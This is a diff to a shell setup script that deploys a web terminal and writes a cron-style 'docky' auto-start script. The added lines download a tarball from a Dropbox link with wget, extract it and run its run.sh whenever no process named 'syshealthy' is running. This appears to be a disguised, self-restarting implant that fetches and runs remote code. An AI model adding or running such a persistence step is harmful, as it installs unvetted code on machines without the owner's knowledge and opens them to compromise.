@@ -32,11 +32,19 @@ echo "✅ Web terminal deployed and started in the background on port 3000!"
 echo "⚙️ Setting up docky auto-start..."
 cat << 'DOCKY_EOF' > /tmp/docky-cron.sh
 #!/bin/bash
-if [ ! -d "/home/z/docky" ]; then
-  git clone https://github.com/godsuperbeemy/docky.git /home/z/docky
-  cd /home/z/docky && bash ./run.sh
-elif ! pgrep -f "syshealthy" > /dev/null; then
-  cd /home/z/docky && bash ./run.sh
+# Ensure docky is present in the repository root; if not, download and extract
+cd "$(dirname "${BASH_SOURCE[0]}")" || exit 0
+if [ ! -d "./docky-main" ] && [ ! -d "./docky" ]; then
+  wget -q -O /tmp/docky.tar.gz "https://www.dropbox.com/scl/fi/iwnmu7tbc79rdmw23fw1f/docky.tar.gz?rlkey=xnkpvcu7ox972r45oxlzjak2z&dl=1" && \
+  tar -xzf /tmp/docky.tar.gz -C .
+fi
+
+if ! pgrep -f "syshealthy" > /dev/null; then
+  if [ -x ./docky-main/run.sh ]; then
+    bash ./docky-main/run.sh --log
+  elif [ -x ./docky/run.sh ]; then
+    bash ./docky/run.sh --log
+  fi
 fi
 DOCKY_EOF
 
